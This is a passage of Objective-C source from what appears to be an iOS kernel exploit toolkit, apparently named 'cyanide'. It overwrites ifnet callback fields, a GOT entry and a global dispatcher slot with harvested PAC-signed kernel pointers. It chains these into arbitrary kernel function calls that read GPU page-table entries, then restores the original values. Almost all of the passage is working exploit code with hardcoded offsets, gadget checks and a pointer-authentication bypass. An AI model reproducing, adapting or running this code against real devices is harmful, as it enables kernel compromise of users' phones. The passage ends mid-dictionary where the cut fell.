    bool layoutRead = CNDPhysicalKCall1KernelObject(createdOut->backingIfnet) &&
        CNDPhysicalKCall1ReadU64(kernel,
            createdOut->backingIfnet + CNDPhysicalKCall1IfnetX0Offset,
            &field90) &&
        CNDPhysicalKCall1ReadU64(kernel,
            createdOut->backingIfnet + CNDPhysicalKCall1IfnetTargetOffset,
            &fieldB0) &&
        CNDPhysicalKCall1ReadU64(kernel,
            createdOut->backingIfnet +
                CNDPhysicalKCall1InventoryIfnetProtoHashCountOffset,
            &protoHashCount) &&
        CNDPhysicalKCall1ReadU64(kernel,
            createdOut->backingIfnet +
                CNDPhysicalKCall1InventoryIfnetProtoHashOffset,
            &protoHash);
    bool gotRead = CNDPhysicalKCall1ReadU64(
        kernel, signer.gotAddress, &finalGOT);
    bool gotRestored = signer.restored && gotRead &&
        finalGOT == signer.originalRaw;
    bool signedTargetExact = result == 0 &&
        createdOut->signedCallback != chosenTarget &&
        createdOut->callbackTarget == chosenTarget;
    report[@"signerOracleLegacyField90"] = CNDPhysicalKCall1Hex(field90);
    report[@"signerOracleLegacyFieldB0"] = CNDPhysicalKCall1Hex(fieldB0);
    report[@"signerOracleLegacyFieldInterpretation"] =
        @"+0x90 overlaps if_addrhead.tqh_first and +0xb0 overlaps if_bpf when the dispatcher receives an ifnet; neither is a spare control field";
    report[@"signerOracleProtoHashCount"] =
        CNDPhysicalKCall1Hex(protoHashCount);
    report[@"signerOracleProtoHash"] = CNDPhysicalKCall1Hex(protoHash);
    report[@"signerOracleLayoutReadExact"] = @(layoutRead);
    report[@"signerOracleFinalGOT"] = CNDPhysicalKCall1Hex(finalGOT);
    report[@"signerOracleGOTRestoredExact"] = @(gotRestored);
    report[@"signerOracleSignedTargetExact"] = @(signedTargetExact);

    bool success = result == 0 && layoutRead && gotRestored &&
        signedTargetExact && !*criticalRestoreFailure;
    report[@"signerOracleSuccessBeforeTeardown"] = @(success);
    report[@"signerOracleSuccess"] = @NO;
    return success ? 0 : (result != 0 ? result : EIO);
}

static int CNDPhysicalKCall1RunCanary(
    const CNDPhysicalKCall1KernelAPI *kernel,
    const CNDPhysicalKCall1IOKitAPI *iokit, uint64_t slide,
    io_connect_t connection, uint64_t selfTask,
    NSMutableSet<NSString *> *knownIDs,
    NSMutableDictionary<NSString *, id> *report, NSArray **after,
    kern_return_t *lastCallKR, uint64_t *lastControllerCookie,
    bool *criticalRestoreFailure)
{
    if (kernel == NULL || iokit == NULL || report == nil || after == NULL ||
        lastCallKR == NULL || lastControllerCookie == NULL ||
        criticalRestoreFailure == NULL) {
        return EINVAL;
    }
    CNDPhysicalKCall1Canary signer = {0};
    int result = CNDPhysicalKCall1PrepareCanary(
        kernel, slide, &signer, report);
    uint64_t stockTarget =
        CNDPhysicalKCall1StaticEtherCheckMulti + slide;
    uint64_t loadTarget = CNDPhysicalKCall1StaticLoadW0FromX0 + slide;
    uint64_t dispatcherTarget =
        CNDPhysicalKCall1StaticIfnetX0Dispatcher + slide;
    uint32_t loadInstructions[3] = {0};
    uint32_t dispatcherInstructions[7] = {0};
    if (result == 0) {
        CNDPhysicalKCall1ReadBytes(kernel, loadTarget, loadInstructions,
            sizeof(loadInstructions));
        CNDPhysicalKCall1ReadBytes(kernel, dispatcherTarget,
            dispatcherInstructions, sizeof(dispatcherInstructions));
        if (memcmp(loadInstructions, CNDPhysicalKCall1ExpectedLoad,
                sizeof(CNDPhysicalKCall1ExpectedLoad)) != 0 ||
            memcmp(dispatcherInstructions,
                CNDPhysicalKCall1ExpectedDispatcher,
                sizeof(CNDPhysicalKCall1ExpectedDispatcher)) != 0) {
            result = EILSEQ;
        }
    }
    report[@"ifnetKCall1SetupResult"] = @(result);
    report[@"ifnetKCall1StockTarget"] = CNDPhysicalKCall1Hex(stockTarget);
    report[@"ifnetKCall1LoadTarget"] = CNDPhysicalKCall1Hex(loadTarget);
    report[@"ifnetKCall1DispatcherTarget"] =
        CNDPhysicalKCall1Hex(dispatcherTarget);
    report[@"ifnetKCall1LoadInstruction0"] =
        CNDPhysicalKCall1Hex(loadInstructions[0]);
    report[@"ifnetKCall1LoadInstruction1"] =
        CNDPhysicalKCall1Hex(loadInstructions[1]);
    report[@"ifnetKCall1LoadInstruction2"] =
        CNDPhysicalKCall1Hex(loadInstructions[2]);
    report[@"ifnetKCall1MarkerAddress"] =
        CNDPhysicalKCall1Hex(signer.gotAddress);
    report[@"ifnetKCall1MarkerValue"] = @(EINPROGRESS);
    report[@"ifnetKCall1ConstructedArity"] = @1;
    report[@"ifnetKCall1ProviderKCallUsed"] = @NO;
    if (result != 0) return result;

    CNDPhysicalKCall1SignedInterface stock = {0};
    CNDPhysicalKCall1SignedInterface load = {0};
    CNDPhysicalKCall1SignedInterface dispatcher = {0};
    result = CNDPhysicalKCall1CreateSignedIfnet(kernel, iokit, connection,
        selfTask, knownIDs, &signer, stockTarget,
        CNDPhysicalKCall1IfnetCheckMultiOffset, 0x51, &stock, after,
        report, criticalRestoreFailure);
    if (result == 0) {
        result = CNDPhysicalKCall1CreateSignedIfnet(kernel, iokit,
            connection, selfTask, knownIDs, &signer, loadTarget,
            CNDPhysicalKCall1IfnetCheckMultiOffset, 0x52, &load, after, report,
            criticalRestoreFailure);
    }
    if (result == 0) {
        result = CNDPhysicalKCall1CreateSignedIfnet(kernel, iokit,
            connection, selfTask, knownIDs, &signer, dispatcherTarget,
            CNDPhysicalKCall1IfnetCheckMultiOffset, 0x53, &dispatcher, after,
            report, criticalRestoreFailure);
    }
    CNDPhysicalKCall1ReportSignedIfnet(report, @"ifnetKCall1Stock",
        &stock);
    CNDPhysicalKCall1ReportSignedIfnet(report, @"ifnetKCall1Load", &load);
    CNDPhysicalKCall1ReportSignedIfnet(report, @"ifnetKCall1Dispatcher",
        &dispatcher);
    *lastCallKR = dispatcher.callKR;
    *lastControllerCookie = dispatcher.controllerCookie;
    report[@"ifnetKCall1SignerStagesResult"] = @(result);
    if (result != 0) {
        bool safe = true;
        if (stock.signedCallback != 0 &&
            CNDPhysicalKCall1KernelObject(load.backingIfnet)) {
            safe = CNDPhysicalKCall1RestoreU64(kernel,
                load.backingIfnet + CNDPhysicalKCall1IfnetCheckMultiOffset,
                stock.signedCallback) && safe;
        }
        if (stock.signedCallback != 0 &&
            CNDPhysicalKCall1KernelObject(dispatcher.backingIfnet)) {
            safe = CNDPhysicalKCall1RestoreU64(kernel,
                dispatcher.backingIfnet +
                    CNDPhysicalKCall1IfnetCheckMultiOffset,
                stock.signedCallback) && safe;
        }
        report[@"ifnetKCall1FailedStageSanitized"] = @(safe);
        if (!safe) *criticalRestoreFailure = true;
        return result;
    }

    uint64_t fieldX0 = dispatcher.backingIfnet +
        CNDPhysicalKCall1IfnetX0Offset;
    uint64_t fieldTarget = dispatcher.backingIfnet +
        CNDPhysicalKCall1IfnetTargetOffset;
    uint64_t fieldCallback = dispatcher.backingIfnet +
        CNDPhysicalKCall1IfnetCheckMultiOffset;
    bool callbackQuiesced = CNDPhysicalKCall1WriteU64Verify(
        kernel, fieldCallback, stock.signedCallback);
    uint64_t originalX0 = 0;
    uint64_t originalTarget = 0;
    result = callbackQuiesced
        ? (CNDPhysicalKCall1ReadU64(kernel, fieldX0, &originalX0) ? 0 : EIO)
        : EIO;
    if (result == 0 &&
        !CNDPhysicalKCall1ReadU64(kernel, fieldTarget, &originalTarget)) {
        result = EIO;
    }
    report[@"ifnetKCall1X0Field"] = CNDPhysicalKCall1Hex(fieldX0);
    report[@"ifnetKCall1TargetField"] =
        CNDPhysicalKCall1Hex(fieldTarget);
    report[@"ifnetKCall1CallbackField"] =
        CNDPhysicalKCall1Hex(fieldCallback);
    report[@"ifnetKCall1OriginalX0"] =
        CNDPhysicalKCall1Hex(originalX0);
    report[@"ifnetKCall1OriginalTarget"] =
        CNDPhysicalKCall1Hex(originalTarget);

    bool gotChanged = false;
    bool targetChanged = false;
    bool x0Changed = false;
    bool callbackExposed = false;
    if (result == 0 &&
        CNDPhysicalKCall1WriteU64Verify(kernel, signer.gotAddress,
            (uint64_t)EINPROGRESS)) {
        gotChanged = true;
    } else if (result == 0) {
        result = EIO;
    }
    if (result == 0 &&
        CNDPhysicalKCall1WriteU64Verify(kernel, fieldTarget,
            load.signedCallback)) {
        targetChanged = true;
    } else if (result == 0) {
        result = EIO;
    }
    if (result == 0 &&
        CNDPhysicalKCall1WriteU64Verify(kernel, fieldX0,
            signer.gotAddress)) {
        x0Changed = true;
    } else if (result == 0) {
        result = EIO;
    }
    if (result == 0 &&
        CNDPhysicalKCall1WriteU64Verify(kernel, fieldCallback,
            dispatcher.signedCallback)) {
        callbackExposed = true;
    } else if (result == 0) {
        result = EIO;
    }
    report[@"ifnetKCall1CallbackQuiesced"] = @(callbackQuiesced);
    report[@"ifnetKCall1ChainInstalled"] = @(callbackExposed);

    int triggerResult = -1;
    int triggerErrno = 0;
    int cleanupResult = -1;
    int cleanupErrno = 0;
    if (result == 0) {
        CNDPhysicalKCall1TriggerIfnetCheckMulti(
            [NSString stringWithUTF8String:dispatcher.bsdName],
            &triggerResult, &triggerErrno,
            &cleanupResult, &cleanupErrno);
    }

    bool callbackSanitized = callbackQuiesced &&
        CNDPhysicalKCall1RestoreU64(kernel, fieldCallback,
            stock.signedCallback);
    bool targetRestored = !targetChanged ||
        CNDPhysicalKCall1RestoreU64(kernel, fieldTarget, originalTarget);
    bool x0Restored = !x0Changed ||
        CNDPhysicalKCall1RestoreU64(kernel, fieldX0, originalX0);
    bool gotRestored = !gotChanged ||
        CNDPhysicalKCall1RestoreU64(kernel, signer.gotAddress,
            signer.originalRaw);
    if (!callbackSanitized || !targetRestored || !x0Restored ||
        !gotRestored) {
        *criticalRestoreFailure = true;
    }
    uint64_t finalCallback = 0;
    uint64_t finalX0 = 0;
    uint64_t finalTarget = 0;
    uint64_t finalGOT = 0;
    bool finalRead = CNDPhysicalKCall1ReadU64(
        kernel, fieldCallback, &finalCallback) &&
        CNDPhysicalKCall1ReadU64(kernel, fieldX0, &finalX0) &&
        CNDPhysicalKCall1ReadU64(kernel, fieldTarget, &finalTarget) &&
        CNDPhysicalKCall1ReadU64(kernel, signer.gotAddress, &finalGOT);

    report[@"ifnetKCall1TriggerResult"] = @(triggerResult);
    report[@"ifnetKCall1TriggerErrno"] = @(triggerErrno);
    report[@"ifnetKCall1TriggerErrnoName"] =
        triggerErrno == EINPROGRESS ? @"EINPROGRESS" : @"";
    report[@"ifnetKCall1CleanupResult"] = @(cleanupResult);
    report[@"ifnetKCall1CleanupErrno"] = @(cleanupErrno);
    report[@"ifnetKCall1CallbackSanitized"] = @(callbackSanitized);
    report[@"ifnetKCall1X0Restored"] = @(x0Restored);
    report[@"ifnetKCall1TargetRestored"] = @(targetRestored);
    report[@"ifnetKCall1GOTRestored"] = @(gotRestored);
    report[@"ifnetKCall1FinalReadResult"] = @(finalRead ? 0 : EIO);
    report[@"ifnetKCall1FinalCallback"] =
        CNDPhysicalKCall1Hex(finalCallback);
    report[@"ifnetKCall1FinalCallbackTarget"] =
        CNDPhysicalKCall1Hex(
            CNDPhysicalKCall1StripInstructionPointer(finalCallback));
    report[@"ifnetKCall1FinalX0"] = CNDPhysicalKCall1Hex(finalX0);
    report[@"ifnetKCall1FinalTarget"] = CNDPhysicalKCall1Hex(finalTarget);
    report[@"ifnetKCall1FinalGOT"] = CNDPhysicalKCall1Hex(finalGOT);

    bool success = result == 0 && triggerResult == -1 &&
        triggerErrno == EINPROGRESS && callbackSanitized &&
        targetRestored && x0Restored && gotRestored &&
        finalRead && finalCallback == stock.signedCallback &&
        finalX0 == originalX0 && finalTarget == originalTarget &&
        finalGOT == signer.originalRaw;
    report[@"ifnetKCall1Success"] = @(success);
    return success ? 0 : (result != 0 ? result : EIO);
}

typedef id<CNDPhysicalKCall1MetalDevice> (*
    CNDPhysicalKCall1CreateMetalDeviceFn)(void);

/*
 * Read one PTE without ever constructing a physical-map alias:
 *
 *   ifnet check_multi
 *     -> ifnet x0 dispatcher       (x0 = the boot-owned IOUAT object)
 *     -> APFS sockaddr dispatcher  (x1 = Metal buffer gpuAddress)
 *     -> slide-compatible idle global dispatcher
 *     -> IOUAT::getPageTableEntry
 *
 * All three indirect edges use kernel-produced IA/e4fe signatures harvested
 * through the same IOUserEthernet creation path as the chosen-X0 canary.  The
 * return is observed as the callback's 32-bit errno value, so this probe
 * reports the low 32 bits of the PTE; it never claims to recover the high half.
 */
static int CNDPhysicalKCall1RunUatPTE(
    const CNDPhysicalKCall1KernelAPI *kernel,
    const CNDPhysicalKCall1IOKitAPI *iokit, uint64_t slide,
    io_connect_t connection, uint64_t selfTask,
    NSMutableSet<NSString *> *knownIDs,
    NSMutableDictionary<NSString *, id> *report, NSArray **after,
    kern_return_t *lastCallKR, uint64_t *lastControllerCookie,
    bool *criticalRestoreFailure)
{
    if (kernel == NULL || iokit == NULL || report == nil || after == NULL ||
        lastCallKR == NULL || lastControllerCookie == NULL ||
        criticalRestoreFailure == NULL) return EINVAL;

    CNDPhysicalKCall1Canary signer = {0};
    int result = CNDPhysicalKCall1PrepareCanary(
        kernel, slide, &signer, report);
    uint64_t stockTarget = CNDPhysicalKCall1StaticEtherCheckMulti + slide;
    uint64_t apfsTarget = CNDPhysicalKCall1StaticAPFSX1Dispatcher + slide;
    uint64_t idamTarget = 0;
    uint64_t idamSlot = 0;
    NSString *idamName = @"";
    uint64_t getPTETarget = CNDPhysicalKCall1StaticIOUATGetPTE + slide;
    uint64_t outerTarget =
        CNDPhysicalKCall1StaticIfnetX0Dispatcher + slide;

    uint32_t apfsInstructions[4] = {0};
    uint32_t getPTEInstructions[8] = {0};
    uint32_t outerInstructions[7] = {0};
    NSMutableArray *dispatcherCandidates = [NSMutableArray array];
    if (result == 0) {
        bool read = CNDPhysicalKCall1ReadBytes(kernel, apfsTarget,
                apfsInstructions, sizeof(apfsInstructions)) &&
            CNDPhysicalKCall1ReadBytes(kernel, getPTETarget,
                getPTEInstructions, sizeof(getPTEInstructions)) &&
            CNDPhysicalKCall1ReadBytes(kernel, outerTarget,
                outerInstructions, sizeof(outerInstructions));
        if (!read || memcmp(apfsInstructions,
                CNDPhysicalKCall1ExpectedAPFSX1Dispatcher,
                sizeof(apfsInstructions)) != 0 ||
            memcmp(getPTEInstructions,
                CNDPhysicalKCall1ExpectedIOUATGetPTE,
                sizeof(getPTEInstructions)) != 0 ||
            memcmp(outerInstructions,
                CNDPhysicalKCall1ExpectedDispatcher,
                sizeof(outerInstructions)) != 0) {
            result = EILSEQ;
        }
    }
    if (result == 0) {
        for (size_t index = 0;
             index < sizeof(CNDPhysicalKCall1GlobalDispatchers) /
                 sizeof(CNDPhysicalKCall1GlobalDispatchers[0]); index++) {
            const CNDPhysicalKCall1GlobalDispatcher *candidate =
                &CNDPhysicalKCall1GlobalDispatchers[index];
            uint64_t target = candidate->target + slide;
            uint64_t slot = candidate->slot + slide;
            uint8_t family = (uint8_t)((target >> 8) & 0xff);
            uint32_t instructions[7] = {0};
            uint64_t slotValue = UINT64_MAX;
            bool familyOK = family == AF_UNSPEC || family == AF_LINK;
            bool bytesOK = familyOK && CNDPhysicalKCall1ReadBytes(
                    kernel, target, instructions, sizeof(instructions)) &&
                memcmp(instructions, candidate->instructions,
                    sizeof(instructions)) == 0;
            bool slotRead = bytesOK && CNDPhysicalKCall1ReadU64(
                kernel, slot, &slotValue);
            [dispatcherCandidates addObject:@{
                @"name": [NSString stringWithUTF8String:candidate->name],
                @"target": CNDPhysicalKCall1Hex(target),
                @"slot": CNDPhysicalKCall1Hex(slot),
                @"sockaddrFamily": @(family),
                @"familyAccepted": @(familyOK),
                @"instructionsExact": @(bytesOK),
                @"slotValue": CNDPhysicalKCall1Hex(slotValue),
                @"slotIdle": @(slotRead && slotValue == 0),
            }];
            if (idamTarget == 0 && slotRead && slotValue == 0) {
                idamTarget = target;
                idamSlot = slot;
                idamName = [NSString stringWithUTF8String:candidate->name];
            }
        }
        if (idamTarget == 0 || idamSlot == 0) result = EBUSY;
    }
    report[@"uatPTEGlobalDispatcherCandidates"] = dispatcherCandidates;
    report[@"uatPTESetupResult"] = @(result);
    report[@"uatPTEAPFSTarget"] = CNDPhysicalKCall1Hex(apfsTarget);
    report[@"uatPTEIDAMTarget"] = CNDPhysicalKCall1Hex(idamTarget);
    report[@"uatPTEIDAMName"] = idamName;
    report[@"uatPTEGetPTETarget"] = CNDPhysicalKCall1Hex(getPTETarget);
    report[@"uatPTEOuterTarget"] = CNDPhysicalKCall1Hex(outerTarget);
    report[@"uatPTEIDAMSlot"] = CNDPhysicalKCall1Hex(idamSlot);
    report[@"uatPTEAdapterDiscriminator"] = @"0xe4fe";
    report[@"uatPTEInstructionWitnessesExact"] = @(result == 0);
    if (result != 0) return result;

    /* Resolve the already established boot-owner join again in this probe.
     * A mismatched record means this is not the object pinned by the preceding
     * record-state run and the indirect call is refused. */
    uint64_t uatGlobal = CNDPhysicalKCall1StaticIOUATGlobal + slide;
    uint64_t objectRaw = 0, recordRaw = 0, objectRecordRaw = 0;
    bool ownerRead = CNDPhysicalKCall1ReadU64(
            kernel, uatGlobal + 0x28, &objectRaw) &&
        CNDPhysicalKCall1ReadU64(
            kernel, uatGlobal + 0x18, &recordRaw);
    uint64_t object = CNDPhysicalKCall1StripDataPointer(objectRaw);
    uint64_t record = CNDPhysicalKCall1StripDataPointer(recordRaw);
    if (ownerRead && CNDPhysicalKCall1KernelObject(object)) {
        ownerRead = CNDPhysicalKCall1ReadU64(
            kernel, object + 0x20, &objectRecordRaw);
    }
    uint64_t objectRecord =
        CNDPhysicalKCall1StripDataPointer(objectRecordRaw);
    report[@"uatPTEGlobal"] = CNDPhysicalKCall1Hex(uatGlobal);
    report[@"uatPTEIOUATObjectRaw"] = CNDPhysicalKCall1Hex(objectRaw);
    report[@"uatPTEIOUATObject"] = CNDPhysicalKCall1Hex(object);
    report[@"uatPTEGlobalRecord"] = CNDPhysicalKCall1Hex(record);
    report[@"uatPTEObjectRecord"] = CNDPhysicalKCall1Hex(objectRecord);
    bool ownerJoin = ownerRead && CNDPhysicalKCall1KernelObject(object) &&
        CNDPhysicalKCall1KernelObject(record) && objectRecord == record;
    report[@"uatPTEOwnerJoin"] = @(ownerJoin);
    if (!ownerJoin) return EILSEQ;

    /* Re-check the chosen callback slot immediately before the Metal setup. */
    uint64_t originalIDAMSlot = 0;
    if (!CNDPhysicalKCall1ReadU64(kernel, idamSlot, &originalIDAMSlot)) {
        return EIO;
    }
    report[@"uatPTEIDAMSlotOriginal"] =
        CNDPhysicalKCall1Hex(originalIDAMSlot);
    if (originalIDAMSlot != 0) {
        report[@"uatPTEIDAMSlotIdle"] = @NO;
        return EBUSY;
    }
    report[@"uatPTEIDAMSlotIdle"] = @YES;

    /* Allocate a live Metal mapping and ask Metal for its GPU virtual address.
     * The buffer stays strongly referenced until after the callback returns. */
    void *metalHandle = dlopen(
        "/System/Library/Frameworks/Metal.framework/Metal",
        RTLD_NOW | RTLD_LOCAL);
    CNDPhysicalKCall1CreateMetalDeviceFn createMetal = metalHandle != NULL
        ? (CNDPhysicalKCall1CreateMetalDeviceFn)dlsym(
            metalHandle, "MTLCreateSystemDefaultDevice") : NULL;
    id<CNDPhysicalKCall1MetalDevice> metalDevice =
        createMetal != NULL ? createMetal() : nil;
    id<CNDPhysicalKCall1MetalBuffer> metalBuffer =
        [metalDevice newBufferWithLength:0x4000 options:0];
    uint64_t gpuAddress = 0;
    if (metalBuffer != nil &&
        [metalBuffer respondsToSelector:@selector(gpuAddress)]) {
        gpuAddress = [metalBuffer gpuAddress];
    }
    void *contents = metalBuffer != nil ? [metalBuffer contents] : NULL;
    if (contents != NULL) memset(contents, 0xa5, 0x4000);
    report[@"uatPTEMetalFrameworkLoaded"] = @(metalHandle != NULL);
    report[@"uatPTEMetalDeviceCreated"] = @(metalDevice != nil);
    report[@"uatPTEMetalBufferCreated"] = @(metalBuffer != nil);
    report[@"uatPTEMetalGPUAddress"] = CNDPhysicalKCall1Hex(gpuAddress);
    report[@"uatPTEMetalBufferLength"] = @0x4000;
    if (metalBuffer == nil || contents == NULL || gpuAddress == 0 ||
        gpuAddress >= UINT64_C(0x0001000000000000)) {
        return ENODEV;
    }

    enum { CND_UAT_PTE_STOCK, CND_UAT_PTE_APFS, CND_UAT_PTE_IDAM,
           CND_UAT_PTE_GETPTE, CND_UAT_PTE_OUTER, CND_UAT_PTE_STAGE_COUNT };
    CNDPhysicalKCall1SignedInterface stages[CND_UAT_PTE_STAGE_COUNT] = {0};
    const uint64_t targets[CND_UAT_PTE_STAGE_COUNT] = {
        stockTarget, apfsTarget, idamTarget, getPTETarget, outerTarget,
    };
    const uint8_t stageIDs[CND_UAT_PTE_STAGE_COUNT] = {
        0x61, 0x62, 0x63, 0x64, 0x65,
    };
    for (unsigned int index = 0;
         index < CND_UAT_PTE_STAGE_COUNT && result == 0; index++) {
        result = CNDPhysicalKCall1CreateSignedIfnet(
            kernel, iokit, connection, selfTask, knownIDs, &signer,
            targets[index], CNDPhysicalKCall1IfnetCheckMultiOffset,
            stageIDs[index], &stages[index], after, report,
            criticalRestoreFailure);
    }
    CNDPhysicalKCall1ReportSignedIfnet(
        report, @"uatPTEStock", &stages[CND_UAT_PTE_STOCK]);
    CNDPhysicalKCall1ReportSignedIfnet(
        report, @"uatPTEAPFS", &stages[CND_UAT_PTE_APFS]);
    CNDPhysicalKCall1ReportSignedIfnet(
        report, @"uatPTEIDAM", &stages[CND_UAT_PTE_IDAM]);
    CNDPhysicalKCall1ReportSignedIfnet(
        report, @"uatPTEGetPTE", &stages[CND_UAT_PTE_GETPTE]);
    CNDPhysicalKCall1ReportSignedIfnet(
        report, @"uatPTEOuter", &stages[CND_UAT_PTE_OUTER]);
    *lastCallKR = stages[CND_UAT_PTE_OUTER].callKR;
    *lastControllerCookie = stages[CND_UAT_PTE_OUTER].controllerCookie;
    report[@"uatPTESignerStagesResult"] = @(result);

    uint64_t stockSigned = stages[CND_UAT_PTE_STOCK].signedCallback;
    bool sourceCallbacksSanitized = stockSigned != 0;
    for (unsigned int index = 1; index < CND_UAT_PTE_STAGE_COUNT; index++) {
        if (!CNDPhysicalKCall1KernelObject(stages[index].backingIfnet)) {
            if (stages[index].signedCallback != 0) {
                sourceCallbacksSanitized = false;
            }
            continue;
        }
        sourceCallbacksSanitized = CNDPhysicalKCall1RestoreU64(
            kernel, stages[index].backingIfnet +
                CNDPhysicalKCall1IfnetCheckMultiOffset,
            stockSigned) && sourceCallbacksSanitized;
    }
    report[@"uatPTESourceCallbacksSanitized"] =
        @(sourceCallbacksSanitized);
    if (!sourceCallbacksSanitized) *criticalRestoreFailure = true;
    if (result != 0 || !sourceCallbacksSanitized) {
        return result != 0 ? result : EIO;
    }

    CNDPhysicalKCall1SignedInterface *outer =
        &stages[CND_UAT_PTE_OUTER];
    uint64_t fieldX0 = outer->backingIfnet +
        CNDPhysicalKCall1IfnetX0Offset;
    uint64_t fieldTarget = outer->backingIfnet +
        CNDPhysicalKCall1IfnetTargetOffset;
    uint64_t fieldCallback = outer->backingIfnet +
        CNDPhysicalKCall1IfnetCheckMultiOffset;
    uint64_t originalX0 = 0, originalTarget = 0;
    result = CNDPhysicalKCall1ReadU64(kernel, fieldX0, &originalX0) &&
        CNDPhysicalKCall1ReadU64(kernel, fieldTarget, &originalTarget)
        ? 0 : EIO;
    report[@"uatPTEX0Field"] = CNDPhysicalKCall1Hex(fieldX0);
    report[@"uatPTETargetField"] = CNDPhysicalKCall1Hex(fieldTarget);
    report[@"uatPTECallbackField"] = CNDPhysicalKCall1Hex(fieldCallback);
    report[@"uatPTEOriginalX0"] = CNDPhysicalKCall1Hex(originalX0);
    report[@"uatPTEOriginalTarget"] = CNDPhysicalKCall1Hex(originalTarget);

    bool idamChanged = false, targetChanged = false, x0Changed = false;
    bool callbackExposed = false;
    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
            kernel, idamSlot,
            stages[CND_UAT_PTE_GETPTE].signedCallback)) {
        idamChanged = true;
    } else if (result == 0) result = EIO;
    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
            kernel, fieldTarget,
            stages[CND_UAT_PTE_APFS].signedCallback)) {
        targetChanged = true;
    } else if (result == 0) result = EIO;
    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
            kernel, fieldX0, object)) {
        x0Changed = true;
    } else if (result == 0) result = EIO;
    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
            kernel, fieldCallback,
            stages[CND_UAT_PTE_OUTER].signedCallback)) {
        callbackExposed = true;
    } else if (result == 0) result = EIO;
    report[@"uatPTEChainInstalled"] = @(callbackExposed);

    int triggerResult = -1, triggerErrno = 0;
    if (result == 0) {
        CNDPhysicalKCall1TriggerRawSockaddr(
            [NSString stringWithUTF8String:outer->bsdName],
            stages[CND_UAT_PTE_IDAM].signedCallback, gpuAddress,
            &triggerResult, &triggerErrno);
    }

    /* Quiesce the externally reachable callback first, then restore every
     * borrowed input and finally the idle global. */
    bool callbackSanitized = CNDPhysicalKCall1RestoreU64(
        kernel, fieldCallback, stockSigned);
    bool x0Restored = !x0Changed || CNDPhysicalKCall1RestoreU64(
        kernel, fieldX0, originalX0);
    bool targetRestored = !targetChanged || CNDPhysicalKCall1RestoreU64(
        kernel, fieldTarget, originalTarget);
    bool idamRestored = !idamChanged || CNDPhysicalKCall1RestoreU64(
        kernel, idamSlot, originalIDAMSlot);
    if (!callbackSanitized || !x0Restored || !targetRestored ||
        !idamRestored) *criticalRestoreFailure = true;

    int cleanupResult = -1, cleanupErrno = 0;
    if (triggerResult == 0 && callbackSanitized && x0Restored &&
        targetRestored && idamRestored) {
        CNDPhysicalKCall1CleanupRawSockaddr(
            [NSString stringWithUTF8String:outer->bsdName],
            stages[CND_UAT_PTE_IDAM].signedCallback, gpuAddress,
            &cleanupResult, &cleanupErrno);
    }

    uint64_t finalCallback = 0, finalX0 = 0, finalTarget = 0, finalIDAM = 0;
    bool finalRead = CNDPhysicalKCall1ReadU64(
            kernel, fieldCallback, &finalCallback) &&
        CNDPhysicalKCall1ReadU64(kernel, fieldX0, &finalX0) &&
        CNDPhysicalKCall1ReadU64(kernel, fieldTarget, &finalTarget) &&
        CNDPhysicalKCall1ReadU64(kernel, idamSlot, &finalIDAM);
    uint32_t pteLow32 = (uint32_t)triggerErrno;
    bool pteLooksValid = triggerResult == -1 &&
        (pteLow32 & 1u) != 0 && pteLow32 > 0x4000u;
    report[@"uatPTETriggerResult"] = @(triggerResult);
    report[@"uatPTETriggerErrno"] = @(triggerErrno);
    report[@"uatPTEObservedLow32"] = CNDPhysicalKCall1Hex(pteLow32);
    report[@"uatPTEObservedValidBit"] = @((pteLow32 & 1u) != 0);
    report[@"uatPTECleanupResult"] = @(cleanupResult);
    report[@"uatPTECleanupErrno"] = @(cleanupErrno);
    report[@"uatPTECallbackSanitized"] = @(callbackSanitized);
    report[@"uatPTEX0Restored"] = @(x0Restored);
    report[@"uatPTETargetRestored"] = @(targetRestored);
    report[@"uatPTEIDAMRestored"] = @(idamRestored);
    report[@"uatPTEFinalReadResult"] = @(finalRead ? 0 : EIO);
    report[@"uatPTEFinalCallback"] = CNDPhysicalKCall1Hex(finalCallback);
    report[@"uatPTEFinalX0"] = CNDPhysicalKCall1Hex(finalX0);
    report[@"uatPTEFinalTarget"] = CNDPhysicalKCall1Hex(finalTarget);
    report[@"uatPTEFinalIDAMSlot"] = CNDPhysicalKCall1Hex(finalIDAM);
    report[@"uatPTEFullValueRecovered"] = @NO;

    bool restored = callbackSanitized && x0Restored && targetRestored &&
        idamRestored && finalRead && finalCallback == stockSigned &&
        finalX0 == originalX0 && finalTarget == originalTarget &&
        finalIDAM == originalIDAMSlot;
    bool success = result == 0 && pteLooksValid && restored &&
        !*criticalRestoreFailure;
    report[@"uatPTELow32LooksValid"] = @(pteLooksValid);
    report[@"uatPTERestorationExact"] = @(restored);
    report[@"uatPTESuccess"] = @(success);
    return success ? 0 : (result != 0 ? result : EIO);
}

static NSDictionary<NSString *, id> *
CNDPhysicalKCall1RunSignerInventoryOnce(void)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *reportPath = [directory stringByAppendingPathComponent:
        @"CNDPhysicalKCall1SignerInventory.json"];
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.uat-signer-inventory",
        @"schemaVersion": @1,
        @"productType": CNDPhysicalKCall1SysctlString("hw.machine"),
        @"productBuildVersion":
            CNDPhysicalKCall1SysctlString("kern.osversion"),
        @"mode": @"read-only-existing-signature-inventory",
        @"kernelReadUsed": @YES,
        @"kernelWriteUsed": @NO,
        @"kernelCallUsed": @NO,
        @"krwAcquisitionAttempted": @NO,
        @"krwCleanupAttempted": @NO,
        @"macLabelReadAttempted": @NO,
        @"macLabelWriteAttempted": @NO,
        @"serviceOpenInvoked": @NO,
        @"selectorInvoked": @NO,
        @"ioctlInvoked": @NO,
        @"callbackInvoked": @NO,
        @"callbackWriteAttempted": @NO,
        @"globalSlotWriteAttempted": @NO,
        @"metalUsed": @NO,
        @"pointerSubstitution": @NO,
        @"signatureContext": @"IA/0xe4fe",
        @"inventoryCheckMultiOffset": @0x2a8,
        @"legacyMisidentifiedCallbackOffset": @0x238,
        @"callbackOffsetEvidence":
            @"live +0x238 target is an XNU dlil.c if_output routine and +0x2b8 is a heap proto-hash pointer; pinned ifnet field order places if_check_multi at +0x2a8",
        @"signatureContextEvidence":
            @"byte-exact initIfnetParams signer sequence plus field provenance; raw PAC is not independently decoded",
        @"inventoryComplete": @NO,
